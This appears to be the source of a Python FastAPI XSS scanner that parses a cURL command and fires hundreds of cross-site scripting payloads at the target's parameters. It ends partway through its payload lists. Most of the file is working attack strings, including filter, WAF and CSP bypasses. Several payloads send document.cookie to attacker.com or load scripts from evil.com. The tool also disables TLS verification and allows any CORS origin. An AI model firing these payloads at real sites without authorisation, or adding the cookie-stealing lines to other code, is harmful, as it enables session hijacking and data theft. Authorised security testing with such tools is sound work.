#!/usr/bin/env python3
"""
XSS Security Tester — FastAPI backend  (port 8790)
Accepts a cURL command, discovers params, runs XSS payloads,
reports reflections with context detection.
"""

import re, json, copy, time, html as _html, csv, io, uuid, random, string, threading
from urllib.parse import urlparse, parse_qs, urlunparse
from datetime import datetime
from typing import Optional, Dict, List, Any

import requests as _req
import urllib3
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

JOBS: Dict[str, Any] = {}
MARKER   = "XSS7x9z"
TIMEOUT  = 10
VERIFY   = False

# ─── Random value generator ───────────────────────────────────────────────────

FIRST_NAMES = ["Alice","Bob","Carol","Dave","Eva","Frank","Grace","Hank","Iris","Jack","Karen","Leo"]
LAST_NAMES  = ["Smith","Jones","Brown","Davis","Wilson","Moore","Taylor","Anderson","Thomas","Jackson"]

def _rand_val(fmt: str) -> str:
    def _rep(m):
        t = m.group(1).lower().strip()
        if t == "uuid": return str(uuid.uuid4())
        if t == "email":
            u = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            return f"{u}@testxss.com"
        if t == "name":
            return f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"
        parts = t.split(":")
        k = parts[0]; n = int(parts[1]) if len(parts) > 1 else 8
        if k == "alpha":    return ''.join(random.choices(string.ascii_letters, k=n))
        if k == "alphanum": return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
        if k == "num":      return ''.join(random.choices(string.digits, k=n))
        return m.group(0)
    return re.sub(r'\{([^}]+)\}', _rep, fmt)


# ─── Payload libraries ────────────────────────────────────────────────────────

def _build_quick():
    """~120 payloads across 12 core XSS categories."""
    lib = []
    def add(cat, pl):
        for p in pl: lib.append((cat, p))

    add("script_tag", [
        "<script>alert(1)</script>","<script>alert(document.cookie)</script>",
        "<script>alert(window.location)</script>","<script>alert(document.domain)</script>",
        "<script>alert(1)</script><!--","--><script>alert(1)</script>",
        "</script><script>alert(1)</script>","<script src=\"data:text/javascript,alert(1)\">",
        "<script>${alert(1)}</script>","<script>alert(1)\n</script>",
    ])
    add("event_handler", [
        "<img src=x onerror=alert(1)>","<img src=\"invalid\" onerror=\"alert('XSS')\">",
        "<img src=x onerror=alert(1) />","<img src=x onmouseover=alert(1)>",
        "<input type=\"image\" src=1 onerror=alert(1)>","<video src onerror=alert(1)>",
        "<video><source onerror=\"alert(1)\">","<audio src=x onerror=alert(1)>",
        "<body onload=alert(1)>","<input onfocus=alert(1) autofocus>",
        "<select autofocus onfocus=alert(1)>","<textarea onfocus=\"alert(1)\" autofocus>",
        "<details open ontoggle=alert(1)>","<marquee onstart=alert(1)>",
        "<div onmouseover=\"alert(1)\">Hover me</div>","<p onclick=\"alert(1)\">Click me</p>",
        "<button ondblclick=\"alert(1)\">Double click</button>","<keygen autofocus onfocus=\"alert(1)\">",
        "<isindex type=image src=1 onerror=alert(1)>",
        "<form><button formaction=\"javascript:alert(1)\">X</button></form>",
        "<bgsound src=\"javascript:alert(1)\">",
        "<q><a href=\"bing.com\" onclick=\"alert(document.domain)\">Link</a></q>",
        "<img src=x onload=alert(1)>",
    ])
    add("svg_mathml", [
        "<svg/onload=alert(1)>","<svg><script>alert(1)</script>",
        "<svg><animate onbegin=alert(1)>","<svg><set attributeName=\"onload\" to=\"alert(1)\" begin=\"0s\">",
        "<svg><discard onbegin=\"alert(1)\">","<svg><image href=\"x\" onerror=\"alert(1)\">",
        "<svg><feImage href=\"x\" onerror=\"alert(1)\">","<svg><script xlink:href=data:,alert(1) />",
        "<math href=\"javascript:alert(1)\">","<math><mi xlink:href=\"javascript:alert(1)\">click</mi>",
    ])
    add("js_protocol", [
        "<a href=\"javascript:alert(1)\">Click</a>","<iframe src=javascript:alert(1)>",
        "<iframe srcdoc=\"<script>alert(1)</script>\">","<object data=\"javascript:alert(1)\">",
        "<embed src=\"javascript:alert(1)\">","<form><isindex formaction=\"javascript:alert(1)\">",
        "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1);\">",
        "javascript:alert(1)//","javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>","vbscript:alert(1)",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    ])
    add("attr_injection", [
        "\" autofocus onfocus=\"alert(1)","' autofocus onfocus='alert(1)",
        "\" onmouseover=\"alert(1)\"","' onmouseover='alert(1)'",
        "\" onfocus=\"alert(1)\" autofocus=\"",
        "\"><script>alert(1)</script>","'><script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>","'><img src=x onerror=alert(1)>",
        "\"><svg/onload=alert(1)>","\"onclick=alert(1) \"","\"/><img src=x onerror=alert(1)>",
    ])
    add("css_based", [
        "<style>@import 'javascript:alert(1)';</style>",
        "<link rel=\"stylesheet\" href=\"javascript:alert(1)\">",
        "<div style=\"width: expression(alert(1));\">",
        "<div style=\"background:url(javascript:alert(1))\">",
        "<table style=\"background: url(javascript:alert(1))\">",
    ])
    add("dom_based", [
        "#\"><img src=x onerror=alert(1)>","\"><svg/onload=alert(1)>",
        "' onload='alert(1)","\" onmouseover=\"alert(1)",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//",
    ])
    add("encoded", [
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;/script&#62;",
        "&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;alert(1)&#x3C;/script&#x3E;",
        "&lt;script&gt;alert(1)&lt;/script&gt;","<scr<script>ipt>alert(1)</scr</script>ipt>",
    ])
    add("filter_bypass", [
        "<ScRiPt>alert(1)</ScRiPt>","<SCRIPT>alert(1)</SCRIPT>","<script x>alert(1)</script x>",
        "`<script>alert(1)</script>","<<script>alert(1)</script>","<script>alert(1);</script>",
        "<script\t>alert(1)</script>","<script\n>alert(1)</script>",
        "<!--<script>alert(1)</script>-->","<![CDATA[<script>alert(1)</script>]]>",
        "</title><script>alert(1)</script>","</style><script>alert(1)</script>",
        "</textarea><script>alert(1)</script>","<sCrIpT>alert(1)</sCrIpT>","<script/src=data:,alert(1)>",
    ])
    add("polyglot", [
        "jaVasCript:/*-/*/*/*'/*\"/*/*/*!/*\\/*--></script><img src=x onerror=alert(1)//",
        "\"><img src=x onerror=alert(1);>","'><img src=x onerror=alert(1);>",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//",
        "</script><svg onload=alert(1)>","'\"--><svg onload=alert(1)>",
        "<script>/*</script><img src=x onerror=alert(1)>*/",
    ])
    add("portswigger", [
        "<img src=1 onerror=alert(1)>","\"><img src=1 onerror=alert(1)>",
        "'-alert(1)-'","\"-alert(1)-\"","</p><script>alert(1)</script>",
        "<svg onload=alert(1)>","javascript:alert(document.cookie)",
        "<a href=javascript:alert(1)>","<iframe src=\"javascript:alert(document.domain)\">",
        "\"><svg/onload=alert(document.domain)>","<img src=x onerror=alert(document.domain)>",
        "alert(document.domain)","alert(1)","\"><details/open/ontoggle=alert(1)>",
    ])
    add("context_breakout", [
        "</script><script>alert(1)</script>","\\';<script>alert(1)</script>",
        "\\\";<script>alert(1)</script>",");alert(1);//","');alert(1);//","\");alert(1);//",
        "'-alert(1)-'","\"-alert(1)-\"`-alert(1)-`",
        "</textarea><script>alert(1)</script>","</title><script>alert(1)</script>",
        "</style><img src=x onerror=alert(1)>",
    ])

    seen, unique = set(), []
    for cat, p in lib:
        if p not in seen: seen.add(p); unique.append((cat, p))
    return unique


def _build_full():
    """700+ payloads across 37 XSS categories (superset of quick)."""
    lib = []
    def add(cat, pl):
        for p in pl: lib.append((cat, p))

    add("script_tag", [
        "<script>alert(1)</script>","<script>alert(document.cookie)</script>",
        "<script>alert(window.location)</script>","<script>alert(document.domain)</script>",
        "<script>alert(1)</script><!--","--><script>alert(1)</script>",
        "</script><script>alert(1)</script>","<script src=\"data:text/javascript,alert(1)\">",
        "<script>${alert(1)}</script>","<script>alert(1)\n</script>",
        "<script>alert`1`</script>","<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>eval('ale'+'rt(1)')</script>","<script>setTimeout('alert(1)',0)</script>",
        "<script>setInterval('alert(1)',9999)</script>","<script>window['alert'](1)</script>",
        "<script>this['alert'](1)</script>","<script>[].constructor.constructor('alert(1)')()</script>",
        "<script>(function(){alert(1)})()</script>","<script>void(alert(1))</script>",
        "<script>throw onerror=alert,1337</script>","<script>throw alert(1)</script>",
        "<script>new Function('alert(1)')()</script>","<script>Function('alert(1)')()</script>",
        "<script>top['al'+'ert'](1)</script>","<script>window.onerror=alert;throw 1</script>",
        "<script>document.write('<img src=x onerror=alert(1)>')</script>",
        "<script type=\"text/javascript\">alert(1)</script>",
        "<script>location='javascript:alert(1)'</script>",
        "<script>import('data:text/javascript,alert(1)')</script>",
        "<script>{alert(1)}</script>","<script>alert(1)//\n</script>",
        "<script>alert(/XSS/.source)</script>","<script>alert(document.URL)</script>",
        "<script>alert(1);</script>",
    ])
    add("event_handler", [
        "<img src=x onerror=alert(1)>","<img src=\"invalid\" onerror=\"alert('XSS')\">",
        "<img src=x onerror=alert(1) />","<img src=x onmouseover=alert(1)>",
        "<input type=\"image\" src=1 onerror=alert(1)>","<video src onerror=alert(1)>",
        "<video><source onerror=\"alert(1)\">","<audio src=x onerror=alert(1)>",
        "<body onload=alert(1)>","<input onfocus=alert(1) autofocus>",
        "<select autofocus onfocus=alert(1)>","<textarea onfocus=\"alert(1)\" autofocus>",
        "<details open ontoggle=alert(1)>","<marquee onstart=alert(1)>",
        "<div onmouseover=\"alert(1)\">Hover me</div>","<p onclick=\"alert(1)\">Click me</p>",
        "<button ondblclick=\"alert(1)\">Double click</button>","<keygen autofocus onfocus=\"alert(1)\">",
        "<isindex type=image src=1 onerror=alert(1)>",
        "<form><button formaction=\"javascript:alert(1)\">X</button></form>",
        "<bgsound src=\"javascript:alert(1)\">",
        "<q><a href=\"bing.com\" onclick=\"alert(document.domain)\">Link</a></q>",
        "<img src=x onanimationstart=alert(1)>","<img src=x onanimationend=alert(1)>",
        "<div ontransitionend=alert(1) style=\"transition:all .1s\">x</div>",
        "<body onpageshow=alert(1)>","<body onhashchange=alert(1)>","<body onresize=alert(1)>",
        "<body onscroll=alert(1)>","<body onfocus=alert(1)>",
        "<input onblur=alert(1) autofocus><input autofocus>",
        "<form onsubmit=alert(1)><input type=submit>",
        "<input type=checkbox onchange=alert(1) checked>",
        "<select onchange=alert(1)><option>1</option><option>2</option></select>",
        "<marquee loop=1 onfinish=alert(1)>x</marquee>",
        "<div draggable=true ondrag=alert(1)>drag me</div>",
        "<div contenteditable=true onpaste=alert(1)>paste here</div>",
        "<div contenteditable=true oninput=alert(1)>type here</div>",
        "<object onload=alert(1)>","<img srcset=x onerror=alert(1)>",
        "<img loading=lazy onerror=alert(1) src=x>","<button onpointerenter=alert(1)>hover</button>",
        "<div onpointerover=alert(1)>x</div>","<p oncontextmenu=alert(1)>right click</p>",
        "<p onkeydown=alert(1) tabindex=0>press key</p>","<img src=x onload=alert(1)>",
    ])
    add("svg_mathml", [
        "<svg/onload=alert(1)>","<svg><script>alert(1)</script>",
        "<svg><animate onbegin=alert(1)>","<svg><set attributeName=\"onload\" to=\"alert(1)\" begin=\"0s\">",
        "<svg><discard onbegin=\"alert(1)\">","<svg><image href=\"x\" onerror=\"alert(1)\">",
        "<svg><feImage href=\"x\" onerror=\"alert(1)\">","<svg><script xlink:href=data:,alert(1) />",
        "<math href=\"javascript:alert(1)\">","<math><mi xlink:href=\"javascript:alert(1)\">click</mi>",
        "<svg onload=alert(1)><animate attributeName=onload values=alert(1) dur=1s repeatCount=1/>",
        "<svg><a xlink:href=\"javascript:alert(1)\"><text y=20>Click</text></a>",
        "<svg><text onmouseover=alert(1)>Hover</text>",
        "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>",
        "<svg><foreignObject><body xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(1)</script></body></foreignObject></svg>",
        "<math><mtext></math><script>alert(1)</script>",
        "<math><annotation-xml encoding=\"text/html\"><img src=x onerror=alert(1)></annotation-xml></math>",
        "<svg><style>*{fill:expression(alert(1))}</style>","<svg><animate onend=alert(1)>",
        "<svg><ellipse onmouseover=alert(1)>","<svg><circle onmouseover=alert(1)>",
        "<svg><path onmouseover=alert(1)>","<svg><rect onmouseover=alert(1)>",
    ])
    add("js_protocol", [
        "<a href=\"javascript:alert(1)\">Click</a>","<iframe src=javascript:alert(1)>",
        "<iframe srcdoc=\"<script>alert(1)</script>\">","<object data=\"javascript:alert(1)\">",
        "<embed src=\"javascript:alert(1)\">","<form><isindex formaction=\"javascript:alert(1)\">",
        "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1);\">",
        "javascript:alert(1)//","javascript:alert(1)","data:text/html,<script>alert(1)</script>",
        "vbscript:alert(1)","javascript:alert(document.cookie)//","javascript:void(alert(1))",
        "javascript://%0Aalert(1)","javascript://%0d%0aalert(1)","javascript:&#x61;lert(1)",
        "javascript:&#97;lert(1)","j&#97;vascript:alert(1)","java&#x09;script:alert(1)",
        "java&#x0A;script:alert(1)","java&#x0D;script:alert(1)",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "data:text/html;charset=utf-8,<script>alert(1)</script>",
        "<a href=\" &#14; javascript:alert(1)\">x</a>","<a href=\"javascript&colon;alert(1)\">x</a>",
    ])
    add("attr_injection", [
        "\" autofocus onfocus=\"alert(1)","' autofocus onfocus='alert(1)",
        "\" onmouseover=\"alert(1)\"","' onmouseover='alert(1)'","\" onfocus=\"alert(1)\" autofocus=\"",
        "\"><script>alert(1)</script>","'><script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>","'><img src=x onerror=alert(1)>",
        "\"><svg/onload=alert(1)>","\" onerror=alert(1) src=\"","' onerror='alert(1)' src='",
        "\"onmouseover=alert(1) \"","\"onclick=alert(1) \"","\"/><img src=x onerror=alert(1)>",
        "\"/><svg onload=alert(1)>","' onclick=alert(1) x='",
        "\"><details open ontoggle=alert(1)>",
        "\" style=\"animation-name:x\" onanimationstart=alert(1) \"",
        "\"><input autofocus onfocus=alert(1)>","\" tabindex=1 onfocus=alert(1) autofocus=\"",
        "javascript:alert(1)\"","javascript:alert(1)'","\"><iframe/onload=alert(1)>",
        "'><details open ontoggle=alert(1)>",
    ])
    add("css_based", [
        "<style>@import 'javascript:alert(1)';</style>",
        "<link rel=\"stylesheet\" href=\"javascript:alert(1)\">",
        "<div style=\"width: expression(alert(1));\">",
        "<div style=\"background:url(javascript:alert(1))\">",
        "<table style=\"background: url(javascript:alert(1))\">",
        "<style>body{background-image:url(javascript:alert(1))}</style>",
        "<style>@import url(javascript:alert(1))</style>",
        "<style>*{color:expression(alert(1))}</style>",
        "<div style=\"xss:expression(alert(1))\">",
        "<style>li {list-style-image: url(\"javascript:alert(1)\");}</style><ul><li></ul>",
        "<img style=\"xss:expression(alert(1))\" />",
        "<div style=\"font-family:'x')}</style><script>alert(1)</script>\">",
        "<link rel=\"import\" href=\"data:text/html,<script>alert(1)</script>\">",
    ])
    add("dom_based", [
        "#\"><img src=x onerror=alert(1)>","\"><svg/onload=alert(1)>",
        "' onload='alert(1)","\" onmouseover=\"alert(1)",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//",
        "#<script>alert(1)</script>","#\"><script>alert(1)</script>",
        "?search=<script>alert(1)</script>","#'-alert(1)-'","#\"-alert(1)-\"",
        "#<img src=x onerror=alert(1)>","location.href='javascript:alert(1)'",
        "#javascript:alert(1)","?x=</script><script>alert(1)</script>",
        "?callback=alert","?callback=alert(1)//","?jsonp=alert(1)//",
        "#<svg onload=alert(1)>","?id=<script>alert(1)</script>",
    ])
    add("encoded", [
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;/script&#62;",
        "&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;alert(1)&#x3C;/script&#x3E;",
        "&lt;script&gt;alert(1)&lt;/script&gt;","<scr<script>ipt>alert(1)</scr</script>ipt>",
        "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E","%3Csvg%2Fonload%3Dalert(1)%3E",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
        "<a href=\"java&#x09;script:alert(1)\">X</a>","<a href=\"java&#10;script:alert(1)\">X</a>",
        "&#34;&#62;&#60;script&#62;alert(1)&#60;/script&#62;",
        "<img/src/onerror=alert(1)>","%0A%0D<script>alert(1)</script>",
    ])
    add("filter_bypass", [
        "<ScRiPt>alert(1)</ScRiPt>","<SCRIPT>alert(1)</SCRIPT>","<script x>alert(1)</script x>",
        "`<script>alert(1)</script>","<<script>alert(1)</script>","<script>alert(1);</script>",
        "<script\t>alert(1)</script>","<script\n>alert(1)</script>",
        "<!--<script>alert(1)</script>-->","<![CDATA[<script>alert(1)</script>]]>",
        "</title><script>alert(1)</script>","</style><script>alert(1)</script>",
        "</textarea><script>alert(1)</script>","<sCrIpT>alert(1)</sCrIpT>",
        "<script/src=data:,alert(1)>","<script >alert(1)</script >",
        "< script >alert(1)</ script >","<scr&#9;ipt>alert(1)</scr&#9;ipt>",
        "<IMG SRC=\"jav\tascript:alert(1);\">","<IMG SRC=\"jav&#x09;ascript:alert(1);\">",
        "<IMG\nSRC\n=\n\"javascript:alert(1)\">","<IMG SRC=JaVaScRiPt:alert(1)>",
        "<!--[if IE]><script>alert(1)</script><![endif]-->",
        "<SCRIPT/XSS SRC=\"http://attacker.com/xss.js\"></SCRIPT>",
        "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(1)>",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        "<script>al&#101;rt(1)</script>","<IMG \"\"\"><SCRIPT>alert(1)</SCRIPT>\">",
        "<sc\0ript>alert(1)</sc\0ript>","\"><sCrIpT>alert(1)</sCrIpT>",
        "<script>/*\n*/alert(1)</script>",
    ])
    add("polyglot", [
        "jaVasCript:/*-/*/*/*'/*\"/*/*/*!/*\\/*--></script><img src=x onerror=alert(1)//",
        "\"><img src=x onerror=alert(1);>","'><img src=x onerror=alert(1);>",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//",
        "</script><svg onload=alert(1)>","'\"--><svg onload=alert(1)>",
        "<script>/*</script><img src=x onerror=alert(1)>*/","';alert(1);'","\";alert(1);\"",
        "/*</script>*/alert(1)//","</script><img src=x onerror=alert(1)>",
        "<script src=data:,alert(1)></script>","'\"><img src=x onerror=alert(1)>",
        "';alert(1)//","\";alert(1)//","*/alert(1)/*","*/};alert(1)/*",
        "'-alert(1)-'","\"-alert(1)-\"`alert(1)`","${alert(1)}","#{alert(1)}",
        "{{constructor.constructor('alert(1)')()}}","\"><script>alert(1)</script><\"",
        "\"'><img src=x onerror=alert(document.domain)>","</script>\"'><svg onload=alert(1)>",
        "\"'><script>alert(1)</script>","'\"<img src=x onerror=alert(1)>",
    ])
    add("portswigger", [
        "<img src=1 onerror=alert(1)>","\"><img src=1 onerror=alert(1)>",
        "'-alert(1)-'","\"-alert(1)-\"","</p><script>alert(1)</script>",
        "<svg onload=alert(1)>","javascript:alert(document.cookie)",
        "<a href=javascript:alert(1)>","<iframe src=\"javascript:alert(document.domain)\">",
        "\"><svg/onload=alert(document.domain)>","<img src=x onerror=alert(document.domain)>",
        "alert(document.domain)","alert(1)","fetch('https://attacker.com?c='+document.cookie)",
        "location='//attacker.com?'+document.cookie",
        "'-alert(document.domain)-'","\"-alert(document.domain)-\"",
        "<svg/onload=\"alert(document.domain)\">","}alert(1)//{",
        "\\'-alert(1)//","\\\"-alert(1)//","\"><details/open/ontoggle=alert(1)>",
        "<XSS onmouseover=\"alert(1)\">","<object/data=javascript:alert(1)>",
    ])
    add("context_breakout", [
        "</script><script>alert(1)</script>","\\';<script>alert(1)</script>",
        "\\\";<script>alert(1)</script>",");alert(1);//","');alert(1);//","\");alert(1);//",
        "'-alert(1)-'","\"-alert(1)-\"`-alert(1)-`",
        "</textarea><script>alert(1)</script>","</title><script>alert(1)</script>",
        "</style><img src=x onerror=alert(1)>","');}</style><script>alert(1)</script>",
        "\");}alert(1);//","*/alert(1);</script>","*/</style><script>alert(1)</script>",
        "}catch(e){alert(1)}//","throw alert(1)//",
        "/*</textarea>*/</title><script>alert(1)</script>",
        "</noscript><script>alert(1)</script>","}}alert(1)//",
        "/*</script>--><img onerror=alert(1) src=x>",
    ])
    add("js_obfuscation", [
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<script>setTimeout`alert\\x281\\x29`</script>","<script>setInterval`alert\\x281\\x29`</script>",
        "<script>[].sort.call`${alert}1`</script>","<script>Function`a${alert}b`(1)</script>",
        "<img src=x onerror=\"eval('al'+'ert(1)')\">",
        "<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">",
        "<script>window['al'+'ert'](1)</script>","<script>self['al'+'ert'](1)</script>",
        "<script>var a='ale';var b='rt';eval(a+b+'(1)')</script>",
        "<script>\\u0061lert(1)</script>","<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>",
        "<script>[]['flat']['constructor']('alert(1)')()</script>",
        "<svg/onload=\"&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;\">",
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
    ])
    add("template_injection", [
        "{{constructor.constructor('alert(1)')()}}","{{7*7}}",
        "<div ng-app ng-csp>{{$on.constructor('alert(1)')()}}</div>",
        "<div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
        "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}",
        "{{$on.constructor('alert(1)')()}}","${alert(1)}","#{alert(1)}",
        "<%= alert(1) %>","{%alert(1)%}","{{7*'7'}}","__${alert(1)}__:x",
    ])
    add("csp_bypass", [
        "<script nonce=REPLACE_NONCE>alert(1)</script>",
        "<script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js\"></script><div ng-app ng-csp>{{$on.constructor('alert(1)')()}}</div>",
        "<base href=\"https://evil.com/\"><script src=x.js>",
        "<script src=\"data:,alert(1)\">",
        "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
        "<script src=\"https://www.google.com/jsapi?callback=alert\">",
        "<iframe srcdoc=\"<script src='https://evil.com/x.js'></script>\">",
    ])
    add("mutation_xss", [
        "<listing><img src=x onerror=alert(1)></listing>",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        "<textarea><img src=x onerror=alert(1)></textarea>",
        "<math><mi//xlink:href='data:x,<script>alert(1)</script>'>",
        "<table><tbody><tr><td><script>alert(1)</script></td></tr></tbody></table>",
        "<plaintext><img src=x onerror=alert(1)>","<style></style><img src=x onerror=alert(1)>",
        "<noembed><img src=x onerror=alert(1)></noembed>","<frameset onload=alert(1)>",
        "<p style=\"x:expression(alert(1))\">","<noscript><img src=x onerror=alert(1)></noscript>",
    ])
    add("html5_vectors", [
        "<video><source onerror=alert(1)>","<audio onerror=alert(1)><source></audio>",
        "<input type=image onerror=alert(1) src=x>",
        "<dialog open><script>alert(1)</script></dialog>",
        "<script type=module>alert(1)</script>",
        "<input type=submit formaction=javascript:alert(1) value=x>",
        "<button formaction=javascript:alert(1)>click</button>",
        "<link rel=prefetch href=javascript:alert(1)>","<track onerror=alert(1) src=x>",
        "<img decoding=async onerror=alert(1) src=x>",
    ])
    add("unicode_bypass", [
        "<script>alert(1)</script>","＜script＞alert(1)＜/script＞",
        "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x31&#x29>",
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "<script>​alert(1)</script>","<script>‌alert(1)</script>",
        "<script>﻿alert(1)</script>","＜script＞alert(1)＜/script＞",
        "javascript:alert(1)","javascript:alert(1)",
        "<img src=\"jav ascript:alert(1)\">",
    ])
    add("header_meta", [
        "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
        "<meta http-equiv=refresh content=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
        "<link rel=canonical href=javascript:alert(1)>","<link rel=dns-prefetch href=javascript:alert(1)>",
        "<link rel=next href=javascript:alert(1)>","<link rel=prev href=javascript:alert(1)>",
        "<base href=javascript:alert(1)//>","<base target=_blank href=javascript:alert(1)>",
    ])
    add("json_jsonp", [
        "callback=alert(1)//","callback=alert(document.cookie)//","cb=alert(1)//",
        "jsonp=alert(1)//","?callback=<script>alert(1)</script>","\"><script>alert(1)</script>",
        "alert(1)//","/**/alert(1)//","};alert(1)//","{\"x\":\"<script>alert(1)</script>\"}",
        "\"><img src=x onerror=alert(1)>","alert(1)\n//","alert`1`//",
    ])
    add("stored_xss", [
        "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>",
        "<img src=x onerror=\"fetch('//attacker.com?c='+document.cookie)\">",
        "<script>new Image().src='//attacker.com/xss?c='+document.cookie</script>",
        "<script>navigator.sendBeacon('//attacker.com',document.cookie)</script>",
        "<input type=hidden value=\"<script>alert(1)</script>\">",
        "<script>document.forms[0].action='//attacker.com'</script>",
    ])
    add("dom_clobbering", [
        "<img name=x><script>alert(document.x)</script>",
        "<a id=x href=javascript:alert(1)><script>x.click()</script>",
        "<form id=x><input name=action><script>alert(x.action)</script></form>",
        "<a id=defaultView href=javascript:alert(1)>",
        "<img id=location src=x onerror=alert(1)>","<a id=location href=javascript:alert(1)>click</a><script>location</script>",
    ])
    add("prototype_pollution", [
        "?__proto__[innerHTML]=<img/src/onerror=alert(1)>",
        "?__proto__[src]=1&__proto__[onerror]=alert(1)",
        "?constructor[prototype][test]=<img src=x onerror=alert(1)>",
        "{\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(1)>\"}}",
        "{\"constructor\":{\"prototype\":{\"html\":\"<img src=x onerror=alert(1)>\"}}}",
        "?__proto__[location]=javascript:alert(1)",
    ])
    add("css_injection", [
        "</style><script>alert(1)</script>","\"}alert(1)//","';alert(1)//",
        "*{color:red}</style><script>alert(1)</script>",
        "<style>@import'javascript:alert(1)'</style>",
        "body{background:url(javascript:alert(1))}","-moz-binding:url(//attacker.com/xss.xml#xss)",
        "</style><img src=x onerror=alert(1)>","/*</style>*/<script>alert(1)</script>",
        "x</style></title></script><img src=x onerror=alert(1)>",
    ])
    add("browser_specific", [
        "<IMG SRC=vbscript:msgbox(\"XSS\")>","<IMG SRC=livescript:alert(1)>",
        "<!--[if IE]><script>alert(1)</script><![endif]-->",
        "<div style=\"-moz-binding:url('//attacker.com/xss.xml#xss')\">",
        "<script type=text/javascript>alert(1)</script>",
        "<script type=\"module\">alert(1)</script>",
        "<iframe onload=\"alert(1)\" src=\"about:blank\">",
    ])
    add("null_byte_special", [
        "<scr\x00ipt>alert(1)</scr\x00ipt>","<img\x00 src=x onerror=alert(1)>",
        "java\x00script:alert(1)","<a href=\"java\x00script:alert(1)\">X</a>",
        "%00<script>alert(1)</script>","<script\x20>alert(1)</script>",
        "<<SCRIPT>>alert(1)//<</SCRIPT>>","<IMG SRC=\"jav\x09ascript:alert(1);\">",
        "<IMG SRC=\"jav\x0Aascript:alert(1);\">","<img src=x onerror\x3Dalert(1)>",
    ])
    add("second_order", [
        "admin</script><script>alert(1)</script>","\"><script>alert(document.domain)</script>",
        "user@domain.com\"><script>alert(1)</script>","Search: <script>alert(1)</script>",
        "<!-- <script>alert(1)</script> -->","</option></select><script>alert(1)</script>",
        "</td></tr></table><script>alert(1)</script>","</div><script>alert(1)</script>",
    ])
    add("advanced_waf_bypass", [
        "<img src=x onerror=alert`1`>","<svg onload=alert`1`>",
        "<script>onerror=alert;throw 1337</script>",
        "<script>window.onerror=eval;throw'=alert(1)'</script>",
        "<script>Object.keys({'alert(1)':0}).map(eval)</script>",
        "<script>[1].find(alert)</script>","<script>[1].filter(alert)</script>",
        "<script>[1].forEach(alert)</script>","<svg><script>alert&#40;1&#41;</script>",
        "<img src=x onerror=alert(1) a=","<img src=x onerror=alert(1)//",
        "<img src=x onerror=window.alert(1)>","<img src=x onerror=(alert)(1)>",
        "<img src=x onerror=(1,alert)(1)>","<img src=x onerror=top['al'+'ert'](1)>",
        "<details open ontoggle=alert`1`>","<svg/onload=\"window['ale'+'rt'](1)\">",
        "<svg/onload=\"(function(){alert(1)})()\">",
        "<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
        "<audio/src/onerror=alert(1)>","<video/src/onerror=alert(1)>",
        "<body/onload=alert`1`>","<input/onfocus=alert(1) autofocus>",
        "<svg><a><animate attributeName=href values=javascript:alert(1) /><text y=15>click</text></a>",
        "<form><button/formaction=javascript:alert(1)>CLICK","\"onmouseover=alert(1)//",
        "<script>location=`javas`+`cript:ale`+`rt(1)`</script>",
        "<xss id=x tabindex=1 onfocus=alert(1) style=display:block>#x</xss>",
    ])
